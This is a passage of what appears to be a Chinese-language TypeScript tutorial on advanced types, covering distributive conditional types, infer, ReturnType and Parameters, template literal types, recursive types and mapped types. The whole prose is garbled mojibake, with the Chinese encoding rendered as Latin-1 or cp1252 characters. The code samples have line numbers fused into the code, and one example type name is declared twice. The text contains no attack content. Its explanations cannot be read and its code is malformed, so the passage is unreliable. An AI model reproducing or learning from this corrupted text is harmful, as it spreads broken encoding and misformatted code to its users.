ç‚ºæœ‰å‡ºç¾åœ¨ Collection çš„é›†åˆä¸­ï¼Œæ‰€ä»¥æœƒè¢«ç•™ä¸‹ï¼Œè€Œ c å› ç‚ºä¸å±¬æ–¼ Collection çš„é›†åˆæ‰€ä»¥ä¸æœƒè¢«ç•™ä¸‹ã€‚å¦‚æœé€™æ®µæœ‰ç†è§£çš„è©±æ‡‰è©²å°±èƒ½çœ‹æ‡‚ T2 å’Œ T3ï¼Œå› ç‚ºéƒ½æ˜¯ç›¸åŒçš„æ¦‚å¿µã€‚ å¯æ˜¯ä½ ä»”ç´°æƒ³æƒ³å¾Œæœƒç™¼ç¾ä¸€é“ç‘•ç–µï¼Œã€Œç‚ºä»€éº¼å‰é¢æ˜æ˜èªªç¬¦åˆæ¢ä»¶æ™‚å°±å›å‚³ T çš„å‹åˆ¥ï¼ˆa | b | cï¼‰ï¼Œä½†æœ€å¾Œå›å‚³çš„å»åªæœ‰ a | bï¼Ÿèªªå¥½çš„ c å‘¢ï¼Ÿã€ é€™æ˜¯å› ç‚ºç•¶æ³›å‹å‚³å…¥çš„å‹åˆ¥ç‚º union type æ™‚ï¼Œæœƒå‡ºç¾é¡ä¼¼åˆ†é…å¾‹çš„è¡Œç‚ºã€‚å¦‚æœå¿˜è¨˜ä»€éº¼æ˜¯åˆ†é…å¾‹çš„è©±ï¼Œé€™è£¡å¹«ä½ è¤‡ç¿’ä¸€ä¸‹ï¼š 1a * (b + c) = (a * b) + (a * c) æ‰€ä»¥æ‹¿ T1 çš„ä¾‹å­ä¾†ç¤ºç¯„çš„è©±ï¼Œå…¶å¯¦å¯ä»¥æ‹†æˆé€™æ¨£å­ï¼š 12// 'a' | 'b'type T1Distribute = Extract&lt;'a', Collection&gt; | Extract&lt;'b', Collection&gt; T2 çš„è©±å‰‡æ˜¯ï¼š 123456// | 'a' | 'b' | never | nevertype T2 = | Extract&lt;'a', Collection&gt; | Extract&lt;'b', Collection&gt; | Extract&lt;'c', Collection&gt; | Extract&lt;'d', Collection&gt; è¨»ï¼šä»»ä½•è·Ÿ never äº¤é›†çš„çµæœéƒ½é‚„æ˜¯å®ƒè‡ªå·± æ‰€ä»¥é€™å°±æ˜¯ç‚ºä»€éº¼å¯ä»¥åªå›å‚³éƒ¨åˆ†çš„ Tï¼Œå› ç‚ºæœ‰åˆ†é…å¾‹çš„æ¦‚å¿µåœ¨å¾Œé¢ã€‚ ä¸æƒ³è¦åˆ†é…å¾‹çš„è¡Œç‚ºå¦‚æœä¸æƒ³è¦ TS ä½¿ç”¨åˆ†é…å¾‹çš„è¡Œç‚ºä¾†é€²è¡Œåˆ¤æ–·çš„è©±ï¼Œå¯ä»¥åŠ ä¸Š [] ä¾†æ”¹å¯«ï¼š 123456789type ExtractNoDistribute&lt;T, U&gt; = [T] extends [U] ? T : never// 'a' | 'b'type T1 = ExtractNoDistribute&lt;'a' | 'b', Collection&gt;// nevertype T2 = ExtractNoDistribute&lt;'a' | 'b' | 'c', Collection&gt;// 'a'type T3 = ExtractNoDistribute&lt;'a', Collection&gt;// 'b'type T4 = ExtractNoDistribute&lt;'b', Collection&gt; ç¾åœ¨åªæœ‰ç•¶ T å…¨éƒ¨éƒ½ç¬¦åˆæ¢ä»¶æ™‚æ‰æœƒå›å‚³æ•´å€‹ Tï¼Œå¦å‰‡ä¸€ç‡å›å‚³ neverã€‚ InferInfer æ˜¯ä¸€å€‹è®“ TS è‡ªå‹•æ¨å°å‹åˆ¥çš„é—œéµå­—ã€‚é€™é‚Šæœƒæ‹¿å‰é¢ä»‹ç´¹éçš„ Flatten ä¾†ç¤ºç¯„å¦‚ä½•ä½¿ç”¨ï¼š åŸæœ¬åœ¨ Flatten å° T çš„é™åˆ¶æ˜¯ã€Œç¬¦åˆä»»ä½•å‹åˆ¥çš„é™£åˆ—ã€ï¼Œä½†ç¾åœ¨å¯ä»¥åˆ©ç”¨ infer ä¾†è‡ªå‹•æ¨å°å‡ºè©²é™£åˆ—çš„å‹åˆ¥ç‚ºä½•ï¼š å¦‚æœä½ å°æ–¼é€™é‚Šçš„ (infer R)[] æœ‰é»ç–‘æƒ‘çš„è©±ï¼Œå¯ä»¥å›æ†¶ä¸€ä¸‹ä½ åœ¨å¹«é™£åˆ—å®šç¾© type çš„æ™‚å€™éƒ½æ˜¯æ€éº¼å¯«çš„ï¼Œé€šå¸¸æœƒæ˜¯é€™æ¨£å­ï¼š 1234string[]number[]boolean[]... è€Œç¾åœ¨æˆ‘å€‘å¸Œæœ›æŠŠ [] å‰é¢çš„ stringã€number äº¤çµ¦ TS å»è‡ªå‹•åˆ¤æ–·ï¼Œæ‰€ä»¥æ‰æœƒç”¨ (infer R) çš„æ–¹å¼ä¾†å‘Šè¨´ TSï¼šã€Œæˆ‘è¦ä½ å¹«æˆ‘è‡ªå‹•æ¨å°å‡º R çš„å‹åˆ¥ã€ã€‚ æ¥è‘—æˆ‘å€‘åœ¨ç”¨çš„æ™‚å¾Œå°±æœƒæ˜¯é€™æ¨£ï¼š 12345678// æ­¤æ™‚çš„ R ç­‰æ–¼ 'PeaNu' | 'PPB' | 'Andy'type FlattenPersons = Flatten&lt;['PeaNu', 'PPB', 'Andy']&gt;// æ­¤æ™‚çš„ R ç­‰æ–¼ numbertype FlattenNumbers = Flatten&lt;number[]&gt;// æ­¤æ™‚çš„ R ç­‰æ–¼ stringtype FlattenStrings = Flatten&lt;string[]&gt; ä»¥é€™å€‹ä¾‹å­ä¾†èªªå‚³å…¥çš„å‹åˆ¥éƒ½æœ‰ç¬¦åˆã€Œé™£åˆ—å­é›†åˆã€çš„æ¢ä»¶ï¼Œæ‰€ä»¥æœ€å›å‚³çš„å°±æœƒæ˜¯ R çš„å‹åˆ¥ã€‚ 12345678type Persons = ['PeaNu', 'PPB', 'Andy']// 'PeaNu' | 'PPB' | 'Andy'type FlattenPersons = Flatten&lt;Persons&gt;// numbertype FlattenNumbers = Flatten&lt;number[]&gt;// stringtype FlattenStrings = Flatten&lt;string[]&gt; å¦ä¸€å€‹ç¯„ä¾‹å‰›å‰›çš„ç¯„ä¾‹å¯èƒ½çœ‹ä¸å¤ªå‡ºä¾† infer çš„ç”¨é€”ï¼Œæ‰€ä»¥é€™é‚Šå†èˆ‰ä¸€å€‹ä¾‹å­ï¼š é—œæ–¼é€™å€‹å…§å®¹æˆ‘æœƒé€™æ¨£å­ä¾†è§£é‡‹ï¼šã€ŒT å¿…é ˆæ˜¯ {response: ..., status: number} çš„å­é›†åˆï¼Œè‹¥ç¬¦åˆçš„è©±å°±å›å‚³ ...ï¼Œåä¹‹å‰‡å›å‚³ anyã€ã€‚ è€Œ ... çš„éƒ¨åˆ†æˆ‘å€‘ç”¨äº† infer Rï¼Œä¹Ÿå°±æ˜¯è«‹ TS è‡ªå‹•æ¨å°å‡º R çš„å‹åˆ¥ï¼Œä¾‹å¦‚èªªï¼š 12type RespType1 = InferResponse&lt;{ response: { data: 'PeaNu' }; status: 200 }&gt; // { data: 'PeaNu' }type RespType2 = InferResponse&lt;{ status: 200 }&gt; // any RespType1 çš„å…§å®¹å› ç‚ºæœ‰ç¬¦åˆ extends çš„æ¢ä»¶ï¼Œæ‰€ä»¥æœƒå›å‚³ R çš„å‹åˆ¥ã€‚è€Œ R çš„å‹åˆ¥æœƒä¾æ“š response ä¸­çš„å…§å®¹ä¾†åˆ¤æ–·ï¼Œæ‡‰è©²èƒ½çœ‹å‡ºæ˜¯ { data: 'PeaNu' }ï¼Œæ‰€ä»¥é€™å°±æœƒè®Šæˆæœ€å¾Œçš„çµæœã€‚ RespType2 çš„å…§å®¹å› ç‚ºæ²’æœ‰ç¬¦åˆ extends çš„æ¢ä»¶ï¼Œæ‰€ä»¥æœƒç›´æ¥å›å‚³ any å‹åˆ¥ã€‚ ä½¿ç”¨ infer çš„æ™‚æ©Ÿèˆ‡æ³¨æ„äº‹é …çœ‹äº†å‰é¢å…©å€‹ç¯„ä¾‹ä»¥å¾Œæ‡‰è©²èƒ½å¯Ÿè¦º infer é€šå¸¸ä½¿ç”¨åœ¨éœ€è¦æ¢ä»¶åˆ¤æ–·ï¼Œä½†åˆä¸ç¢ºå®šå‹åˆ¥æ™‚ä½¿ç”¨ã€‚ æ­¤å¤–ï¼Œé‚„æœ‰å¹¾å€‹å¿…é ˆè¦éµå¾ªçš„æ¢ä»¶ï¼š infer åªèƒ½ç”¨åœ¨ condition type ä¸­çš„ extends å’Œ ? å‰çš„ä½ç½®ä½¿ç”¨ï¼Œä¸å¯ä»¥åœ¨ä¸€èˆ¬çš„ generic extends ä¸­ä½¿ç”¨ã€‚ infer R çš„é€™å€‹ R è‹¥è¦ç•¶æˆå›å‚³å€¼æ™‚åªèƒ½åœ¨ true çš„æƒ…æ³ï¼ˆå³ ? å¾Œé¢ï¼‰ï¼Œä¸èƒ½åœ¨ false çš„æƒ…æ³ï¼ˆå³ : å¾Œé¢ï¼‰ä¸‹ä½¿ç”¨ã€‚ è©¦è‘—ç†è§£ ReturnType å’Œ Parameterså¦‚æœå‰é¢éƒ½æœ‰ç†è§£çš„è©±ï¼Œé€™å…©å€‹ type æ‡‰è©²å°±ä¸é›£ç†è§£ã€‚ å…ˆä¾†çœ‹ ReturnType çš„åŸå§‹ç¢¼ï¼š å› ç‚ºæ¯”è¼ƒè¤‡é›œï¼Œæ‰€ä»¥é€™é‚Šå¯ä»¥æ‹†æˆå…©å€‹éƒ¨åˆ†ä¾†çœ‹ï¼š 1&lt;T extends (...args: any) =&gt; any&gt; é¦–å…ˆå‚³å…¥çš„ T å¿…é ˆç¬¦åˆã€Œfunction çš„å­é›†åˆï¼Œä¸”è©² function å¯ä»¥æ¥æ”¶ä»»ä½•åƒæ•¸ã€ä»»ä½•å›å‚³å€¼ã€ã€‚ 1T extends (...args: any) =&gt; infer R ? R : any æ¥è‘—æ˜¯æ¢ä»¶åˆ¤æ–·ã€‚è‹¥å‚³å…¥çš„ T ç¬¦åˆæ¢ä»¶ï¼ˆå‰›å‰›ä¸Šé¢æçš„ï¼‰ï¼Œé‚£å°±æŠŠè©² function çš„å›å‚³å€¼ç”¨infer æ¨å°å‡ºä¾†å¾Œå›å‚³ï¼ˆå³ Rï¼‰ï¼Œåä¹‹å‰‡å›å‚³ anyã€‚ å¯¦éš›ä½¿ç”¨èµ·ä¾†æœƒæ˜¯é€™æ¨£ï¼š 1234type FuncReturnType1 = ReturnType&lt;(a: number, b: string) =&gt; number&gt; // numbertype FuncParamsType2 = ReturnType&lt;() =&gt; string&gt; // stringtype FuncParamsType4 = ReturnType&lt;string&gt; // anytype FuncParamsType4 = ReturnType&lt;number&gt; // any æ¥è‘—ä¾†çœ‹ Parameters çš„åŸå§‹ç¢¼ï¼š å…¶å¯¦è·Ÿå‰›å‰›å¾ˆé¡ä¼¼ï¼Œä¸éæˆ‘å€‘ä¸€æ¨£æ‹†æˆå…©éƒ¨åˆ†ä¾†çœ‹ï¼š 1T extends (...args: any) =&gt; any é¦–å…ˆå‚³å…¥çš„ T å¿…é ˆç¬¦åˆã€Œfunction çš„å­é›†åˆï¼Œä¸”è©² function å¯ä»¥æ¥æ”¶ä»»ä½•åƒæ•¸ã€ä»»ä½•å›å‚³å€¼ã€ï¼Œåˆ°ç›®å‰ç‚ºæ­¢éƒ½è·Ÿå‰›å‰›ä¸€æ¨£ã€‚ 1T extends (...args: infer P) =&gt; any ? P : never æ¥è‘—å°±æœ‰é»ä¸åŒäº†ã€‚è‹¥å‚³å…¥çš„ T ç¬¦åˆæ¢ä»¶ï¼ˆå‰›å‰›ä¸Šé¢æçš„ï¼‰ï¼Œé‚£å°±æŠŠè©² function çš„ã€Œåƒæ•¸å€¼ã€ç”¨infer æ¨å°å‡ºä¾†å¾Œå›å‚³ï¼ˆå³ Pï¼‰ï¼Œåä¹‹å‰‡å›å‚³ neverã€‚ æ‰€ä»¥è·Ÿå‰›å‰›çš„å·®åˆ¥åªåœ¨æ–¼ infer çš„å°è±¡ä¸åŒï¼Œä¸€å€‹ infer åƒæ•¸ï¼Œä¸€å€‹ infer å›å‚³å€¼ï¼›ä»¥åŠç•¶æ¢ä»¶ä¸ç¬¦åˆæ™‚å›å‚³ neverã€‚ å¯¦éš›ä½¿ç”¨èµ·ä¾†æœƒæ˜¯é€™æ¨£ï¼š 12345type FunctionParamsType1 = Parameters&lt;(a: number, b: string) =&gt; number&gt; // [a: number, b: string]type FunctionParamsType2 = Parameters&lt;(a: number) =&gt; number&gt; // [a: number]type FunctionParamsType3 = Parameters&lt;() =&gt; number&gt; // []type FunctionParamsType4 = Parameters&lt;string&gt; // nevertype FunctionParamsType5 = Parameters&lt;number&gt; // never Template Literal Typeså¥½åƒæ²’æœ‰ä»€éº¼æ˜¯ TS åšä¸åˆ°çš„ï¼Œå°±é€£ JS çš„ã€ŒTemplate Literalã€ä¹Ÿæ˜¯ã€‚ç›´æ¥ä¾†çœ‹ç¯„ä¾‹ï¼š å°±çœŸçš„è·Ÿä½ åœ¨å¯« JS çš„ç”¨æ³•å¹¾ä¹ä¸€æ¨£ï¼Œä¸è¦æ‡·ç–‘ã€‚ä¸éé™¤äº†ç”¨ä¾†å®šç¾©å‹åˆ¥ä»¥å¤–ï¼Œåœ¨ TS ä¸­å®ƒé‚„æœ‰ä¸€äº›è »æ–¹ä¾¿çš„ç”¨é€”ï¼Œä¸‹é¢ä¾†ä»‹ç´¹ä¸€ä¸‹ã€‚ ç•¶ Template Literal Types ç¢°åˆ° Union æ™‚ç•¶æˆ‘å€‘åœ¨ ${} ä¸­æ”¾å…¥çš„å‹åˆ¥æ˜¯ä¸€å€‹ union æ™‚ï¼Œå®ƒæœƒå†ç”¢ç”Ÿå¦å¤–ä¸€çµ„æ–°çš„ unionï¼Œä¾†çœ‹ç¯„ä¾‹ï¼š æ‰€ä»¥ä¾†è€ƒè€ƒä½ ï¼Œåº•ä¸‹çš„ç¯„ä¾‹æœƒè¼¸å‡ºä»€éº¼ï¼š 123type X = 'left' | 'right'type Y = 'top' | 'bottom'type Position = `${X}-${Y}` // ? ç­”æ¡ˆï¼š 1;'left-top' | 'left-bottom' | 'right-top' | 'right-bottom' æŠŠ Enum çš„ values è®Šæˆ Union Typeå¦‚æœä½ æœ‰ä¸€å€‹ Enum é•·é€™æ¨£ï¼š ç•¶ä½ æƒ³æŠŠé€™äº›ã€Œå€¼ã€è®Šæˆä¸€å€‹ type æ™‚ï¼Œä½ å¯èƒ½æœƒé¡å¤–å¯«ä¸€å€‹ Type Alias ä¾†è™•ç†ï¼š 1type ManufactureValues = 'apple' | 'samsung' | 'google' | 'sony' é€™æ¨£å­çš„ç¼ºé»æ˜¯å¦‚æœæœªä¾†è¦æ–°å¢ MANUFACTURE çš„å…§å®¹æ™‚ï¼Œå°±å¾—åŒæ­¥æ›´æ–° ManufactureValues çš„å…§å®¹ï¼Œå…¶å¯¦é‚„è »éº»ç…©çš„ã€‚ å› æ­¤å¯ä»¥åˆ©ç”¨ Template Literal Types ä¾†æ”¹å¯«æˆé€™æ¨£ï¼š 1type ManufactureValues = `${MANUFACTURE}` // \"apple\" | \"samsung\" | \"google\" | \"sony\" åªè¦æŠŠ MANUFACTURE æ”¾å…¥ ${} ä»¥å¾Œå°±æœƒè‡ªå‹•ç”¢ç”Ÿå°æ‡‰çš„ union å‡ºä¾†ï¼Œéå¸¸éå¸¸å¥½ç”¨ï¼ Recursive typeå»ºç«‹ Type Alias çš„æ–¹å¼æœ‰å¾ˆå¤šç¨®ï¼Œä½†æ²’æƒ³åˆ°é€£ã€Œéè¿´ã€ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ï¼ï¼Ÿè®“æˆ‘å€‘ä¾†çœ‹å€‹ç¯„ä¾‹ï¼š 1234type ValueOrArray&lt;T&gt; = T | T[]type NumberOrNumbers = ValueOrArray&lt;number&gt;let something: NumberOrNumbers = [1, 2, 3]something = 100 é€™è£¡å…ˆå»ºç«‹äº†ä¸€å€‹ ValueOrArrayï¼Œç”¨é€”æ˜¯è®“æˆ‘å€‘å¯ä»¥å»ºç«‹ä¸€å€‹ã€Œç´”å€¼ã€æˆ–ã€Œé™£åˆ—å€¼ã€çš„è®Šæ•¸ï¼Œæ‰€ä»¥ something å¯ä»¥æ˜¯ number æˆ– number[]ã€‚ å¯æ˜¯ç•¶å‡ºç¾å·¢ç‹€é™£åˆ—æ™‚æœƒæœ‰å•é¡Œï¼š å…¶å¯¦ä¹Ÿæ²’ä»€éº¼å¥‡æ€ªçš„ï¼Œå› ç‚ºæˆ‘å€‘åªæœ‰èªªå‹åˆ¥æ˜¯ number[] æˆ– numberï¼Œä¸¦æ²’æœ‰å®šç¾© number[][]ã€‚ æ‰€ä»¥é€™è£¡å¯ä»¥ç”¨éè¿´çš„æ–¹å¼ä¾†è™•ç†ï¼š 123456type ValueOrNestedArray&lt;T&gt; = T | ValueOrNestedArray&lt;T&gt;[]type NumberOrNestedNumbers = ValueOrNestedArray&lt;number&gt;let something: NumberOrNestedNumbers = [1, 2, 3]something = 100// æƒ³å·¢ç‹€å¹¾å±¤éƒ½æ²’å•é¡Œsomething = [1, 2, [3, [4]]] é€™é‚Šçš„ ValueOrNestedArray çš„å€¼æ˜¯ T | ValueOrNestedArray&lt;T&gt;[]ã€‚è¦æ³¨æ„çš„åœ°æ–¹æ˜¯å®ƒåœ¨è£¡é¢åˆå‘¼å«äº†è‡ªå·±ï¼Œæ‰€ä»¥å°±æœƒæœ‰é»é¡ä¼¼é€™æ¨£çš„æ„Ÿè¦ºï¼š 1T | T[] | T[][] | T[][][] | ... æ‰€ä»¥ç”¨é€™ç¨®æ–¹å¼æ”¹å¯«å¾Œå°±èƒ½è™•ç†å·¢ç‹€é™£åˆ—çš„å•é¡Œã€‚ ç¯„ä¾‹ï¼SnakeToCamelCaseé€™æ˜¯å¦ä¸€å€‹éè¿´çš„æ‡‰ç”¨ç¯„ä¾‹ï¼ŒåŸå§‹ç¢¼å¦‚ä¸‹ï¼š é›–ç„¶å‰›é–‹å§‹çœ‹æˆ‘ä¹Ÿè¦ºå¾—æœ‰é»è¤‡é›œï¼Œä¸éæ‹†æˆä¸€å¡Šä¸€å¡Šä¾†è§£è®€å°±æœƒæ¯”è¼ƒå¥½ç†è§£äº†ã€‚æˆ‘å€‘å…ˆä¾†çœ‹ç¬¬ä¸€å€‹éƒ¨åˆ†ï¼š 1type SnakeToCamelCase&lt;T extends string&gt; é€™æ®µçš„æ„æ€æ˜¯ã€Œå‚³å…¥çš„ T å¿…é ˆæ˜¯ string çš„å­é›†åˆã€ã€‚ 1T extends `${infer Head}_${infer Tail}` ? ... : T é€™é‚Šæ˜¯ä¸€å€‹æ¢ä»¶åˆ¤æ–·ï¼Œã€Œç•¶ T å±¬æ–¼ xxx_ooo å­—ä¸²çš„å­é›†åˆã€æ™‚ç¬¦åˆæ¢ä»¶ï¼Œä¸ç¬¦åˆçš„è©±å°±å›å‚³ Tã€‚ æ­¤å¤–ï¼Œé€™é‚Šé‚„æ­é…äº† infer ä¾†æ¨å°å‡ºå­—ä¸²çš„ literal string typeã€‚èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœå‚³å…¥çš„ T ç‚º hello_my_worldï¼Œé‚£ infer å‡ºä¾†çš„çµæœå°±æœƒæ˜¯ hello èˆ‡ my_worldï¼ˆå‰è€…ç‚º Headï¼Œå¾Œè€…ç‚º Tailï¼‰ã€‚ 1;`${Uncapitalize&lt;Head&gt;}${Capitalize&lt;SnakeToCamelCase&lt;Tail&gt;&gt;}` é€™é‚Šä½¿ç”¨äº†å…©å€‹å…§å»ºçš„ Utility Typesï¼š Uncapitalize é¡§åæ€ç¾©ï¼ŒæŠŠç¬¬ä¸€å€‹å­—è½‰æˆå°å¯«ã€‚ Capitalize é¡§åæ€ç¾©ï¼ŒæŠŠç¬¬ä¸€å€‹å­—è½‰æˆå¤§å¯«ã€‚ èˆ‰å€‹ç¯„ä¾‹ï¼š 12type CapitalizeWord1 = Uncapitalize&lt;'Hello'&gt; // 'hello'type CapitalizeWord2 = Capitalize&lt;'world'&gt; // 'World' ç†è§£å¾Œè®“æˆ‘å€‘ç¹¼çºŒå›åˆ°å‰›å‰›çš„æ®µè½ï¼Œç¾åœ¨å‡è¨­ &lt;Head&gt; èˆ‡ &lt;Tail&gt; çš„å€¼ç‚º hello èˆ‡ my_world çš„è©±ï¼Œå‡ºä¾†çš„çµæœæœƒæ˜¯é€™æ¨£ï¼š 1${'hello'}${Capitalize&lt;SnakeToCamelCase&lt;'My_world'&gt;&gt;} é€™é‚Šå¦‚æœè·Ÿæˆ‘ä¸€æ¨£å°éè¿´è‹¦æ‰‹çš„è©±ï¼Œå¯ä»¥å…ˆæ‹¿æ‰ SnakeToCamelCase é€™ä¸€æ®µï¼š 1${'hello'}${Capitalize&lt;'My_world'&gt;} é€™æ¨£å­æœ€å¾Œçš„çµæœå°±æœƒæ˜¯ helloMy_worldï¼Œæ‡‰è©²ä¸é›£ç†è§£ï¼š å¯ä»¥çœ‹åˆ°å¦‚æœæ²’æœ‰éè¿´çš„è©±ï¼Œå°±åªæœƒå°ç¬¬ä¸€æ®µçš„ xxx_ooo åšè½‰æ›ï¼Œå¾Œé¢çš„éƒ¨åˆ†æ²’æœ‰è™•ç†å®Œå…¨ã€‚æ‰€ä»¥é€™å€‹æ™‚å€™æˆ‘å€‘è¦åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼Œå°±æ˜¯æŠŠå‰›å‰›çš„äº‹æƒ…å†åšä¸€æ¬¡ï¼Œåè¦†çš„é‡è¤‡é€™æ®µå‹•ä½œï¼Œç›´åˆ°ä¸æœƒå†å‡ºç¾ xxx_ooo çš„æ ¼å¼ç‚ºæ­¢ï¼Œé€™å€‹å°±æ˜¯éè¿´çš„ç”¨æ„ã€‚ é€™é‚Šé™„ä¸Šéè¿´ä¸­çš„æ¯å€‹æ­¥é©Ÿçš„æµç¨‹ï¼Œå¸Œæœ›æœ‰åŠ©æ–¼ç†è§£ï¼š 1234567891011121314151617181. hello_my_world // ç¬¬ä¸€æ¬¡åŸ·è¡Œ SnakeToCamelCase&lt;'hello_my_world'&gt;${Head} -&gt; 'hello', ${Tail} -&gt; 'my_world'${'hello'}${Capitalize( S( 'my_world' ) )}2. my_world // ç¬¬äºŒæ¬¡åŸ·è¡Œ SnakeToCamelCase&lt;'my_world'&gt;${Head} -&gt; 'my', ${Tail} -&gt; 'world'${'my'}${Capitalize( S( 'world' ) )}3. world // ç¬¬ä¸‰æ¬¡åŸ·è¡Œ SnakeToCamelCase&lt;'world'&gt;åˆ°é€™è£¡æ™‚å› ç‚ºæ²’æœ‰ç¬¦åˆ xxx_ooo å­é›†åˆçš„æ¢ä»¶ï¼Œæ‰€ä»¥ç›´æ¥å›å‚³ Tï¼ˆä¹Ÿå°±æ˜¯ worldï¼‰4. è·³å›æ­¥é©ŸäºŒ${'my'}${Capitalize( 'world' )} -&gt; ${'my'}${'World'}5. è·³å›æ­¥é©Ÿä¸€${'hello'}${Capitalize( 'myWorld' )} -&gt; ${'hello'}${'MyWorld'}çµæŸä¸¦å›å‚³ `helloMyWorld` å‹åˆ¥ æˆ‘è¦ºå¾—éè¿´ä¹‹æ‰€ä»¥é›£æ‡‚ï¼Œæ˜¯åœ¨æ–¼å®ƒçš„åŸ·è¡Œé †åºè·Ÿä½ æƒ³çš„ä¸å¤ªä¸€æ¨£ã€‚ä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œé›–ç„¶ SnakeToCamelCase&lt;'hello_my_world'&gt; æ˜¯ç¬¬ä¸€å€‹è¢«åŸ·è¡Œçš„ï¼Œä½†ä»–å¯¦éš›è·‘å®Œçš„æ™‚é–“é»å»è¦ç­‰åˆ°å¾Œé¢çš„ SnakeToCamelCase&lt;'my_world'&gt;ã€ SnakeToCamelCase&lt;'world'&gt; è·‘å®Œä¸¦æŠŠå€¼å›å‚³ä»¥å¾Œï¼Œæ‰æœƒåŸ·è¡Œå›éé ­ä¾†ä¸‹ä¸€è¡Œçš„ ${'hello'}${Capitalize( 'myWorld' )}ã€‚ æ‰€ä»¥ç¢°åˆ°éè¿´çš„æ™‚å€™è¦å¸¸å¸¸ç”¨åå‘çš„æ–¹å¼å»æ€è€ƒï¼Œè¦ç”¨ã€Œæ’åœ¨å¾Œé¢é‚£å€‹ function çš„å›å‚³å€¼æ‡‰è©²æ˜¯ä»€éº¼ï¼Ÿã€ä¸‹å»æ€è€ƒï¼Œæˆ‘è¦ºå¾—é€™æ¨£å°±æœƒå¥½ç†è§£ä¸€é»äº†ã€‚ typeofå¦‚æœä½ å¯« TS å·²ç¶“æœ‰ä¸€æ®µæ™‚é–“äº†ï¼Œæ‡‰è©²æœƒçŸ¥é“ TS æœ‰ä¸€å€‹è‡ªå‹•æ¨å°çš„åŠŸèƒ½ï¼Œå°±æ˜¯å³ä¾¿æˆ‘å€‘æ²’æœ‰å¹«è®Šæ•¸æŒ‡å®šå‹åˆ¥ï¼Œå®ƒä¹Ÿèƒ½è‡ªå‹•æ¨å°å‡ºä¾†ï¼š é€™æ¨£çš„å¥½è™•æ˜¯ä»€éº¼ï¼Ÿå¥½è™•æ˜¯åªè¦ç”¨ TS ä¸­çš„ typeofï¼ˆä¸æ˜¯ JS çš„é‚£å€‹ï¼‰å°±èƒ½ç”¢ç”Ÿå‡ºæ–°ä¸€å€‹å‹åˆ¥ï¼Œåƒé€™æ¨£ï¼š æ³¨æ„é€™è£¡æ˜¯ç›´æ¥æª¢æŸ¥ä¸€å€‹è®Šæ•¸çš„å‹åˆ¥ï¼ˆbioï¼‰ï¼Œå†æŠŠé€™å€‹å‹åˆ¥è³¦çµ¦ BioTypeï¼Œè·Ÿä»¥å¾€çš„åšæ³•ä¸å¤ªä¸€æ¨£ã€‚ æ—¢ç„¶å¯ä»¥ç”¨ typeof ä¾†å–å‡ºå‹åˆ¥ï¼Œé‚£é€™æ¨£å­ç©ä¹Ÿæ˜¯ ok çš„ï¼š 12345678910const bio = { name: 'PeaNu', age: 24, occupation: 'Frontend', level: 'Senior'}type BioType = typeof bio // { name: string, .... }type BioKeys = keyof typeof bio // \"name\" | \"age\" | \"occupation\" | \"level\"type BioValues = BioType[keyof typeof bio] // string | number åˆ©ç”¨ typeof å–å‡º Enum çš„ Keyä¸Šæ¬¡æœ‰ä»‹ç´¹éå¦‚ä½•ç”¨ Template Literal Types ä¾†å–å‡º Enum çš„å€¼ï¼š 1type ManufactureValues = `${MANUFACTURE}` // \"APPLE\" | \"SAMSUNG\" | \"GOOGLE\" | \"SONY\" é€™æ¬¡ä¾†ä»‹ç´¹å¦‚ä½•ç”¨ typeof ä¾†å–å‡º Enum çš„ keysï¼š 1type ManufactureKeys = keyof typeof MANUFACTURE // \"APPLE\" | \"SAMSUNG\" | \"GOOGLE\" | \"SONY\" é€™å…©æ‹›å­¸èµ·ä¾†å¾Œå° Enum æœƒéå¸¸æœ‰å¹«åŠ©ï¼ Index Signatures &amp; Mapped Typeä¸€èˆ¬åœ¨å¹«ç‰©ä»¶å»ºç«‹å‹åˆ¥æ™‚æœƒé€™æ¨£å­åšï¼š 12345type Person = { firstName: string lastName: string age: number} ä½†å¦‚æœå“ªå¤©ä½ ç¢°åˆ°ã€Œæœ‰å¤ªå¤šå±¬æ€§ã€çš„å•é¡Œæ™‚ï¼Œä½ å¯èƒ½ä¸æœƒæƒ³åƒä¸Šé¢é€™æ¨£å­æŠŠæ¯ä¸€å€‹å±¬æ€§éƒ½åˆ—å‡ºä¾†ï¼Œé€™æ™‚å€™å°±å¯ä»¥æ”¹å¯«æˆé€™æ¨£ï¼š 123type Person = { [key: string]: string | number} é€™ç¨®å¯«æ³•å«åšã€ŒIndex Signaturesã€ã€‚æˆ‘å€‘æ²’æœ‰ç›´æ¥æŒ‡å®šå±¬æ€§åç¨±ï¼Œè€Œæ˜¯ç”¨ä¸€å€‹ key ä¾†ç•¶ä½œè®Šæ•¸ï¼Œä¸¦æŠŠé€™å€‹ key çš„å‹åˆ¥è¨­ç‚º stringã€‚ key åªæ˜¯ä¸€å€‹è®Šæ•¸ï¼Œä½ æƒ³å–ä»€éº¼åå­—éƒ½ okã€‚è€Œå‹åˆ¥çš„éƒ¨åˆ†å¯ä»¥æŒ‡å®šçš„å€¼æœ‰ string | number | symbolã€‚ç•¶ç„¶ï¼Œé€™é‚Š Person çš„å±¬æ€§å¾ˆé¡¯ç„¶æ˜¯ä¸€å€‹å­—ä¸²ï¼Œæ‰€ä»¥ string è‡ªç„¶æ˜¯æœ€ç¬¦åˆçš„å‹åˆ¥ã€‚ åœ¨ç†è§£å®Œ Index Signatures ä»¥å¾Œï¼Œæ¥è‘—å°±å¯ä»¥ä¾†ä»‹ç´¹ã€ŒMapped Typeã€ã€‚ Mapped Type çš„ç”¨æ³•è·Ÿå‰é¢å¾ˆé¡ä¼¼ï¼Œåªå·®åœ¨å®ƒæœƒå¤šç”¨åˆ°ä¸€å€‹ in é—œéµå­—ï¼Œä¾†çœ‹ä¸€å€‹ç¯„ä¾‹ï¼š 123type Person = { [key in 'firstName' | 'lastName']: string} è¨»ï¼šé€™è£¡çš„ key ä¸€æ¨£åªæ˜¯å€‹è®Šæ•¸ï¼Œæƒ³å–å•¥å°±å–å•¥ã€‚ å¦‚æœä½ ç†Ÿ ES6 çš„è©±æ‡‰è©²æœƒè¦ºå¾—é€™è·Ÿ for...in å’Œ for...of çš„å¯«æ³•å¾ˆé¡ä¼¼ã€‚ç¢ºå¯¦ï¼Œé€™å…©è€…èƒŒå¾Œçš„å…±é€šé»å°±æ˜¯ã€Œiterableã€çš„æ¦‚å¿µã€‚ 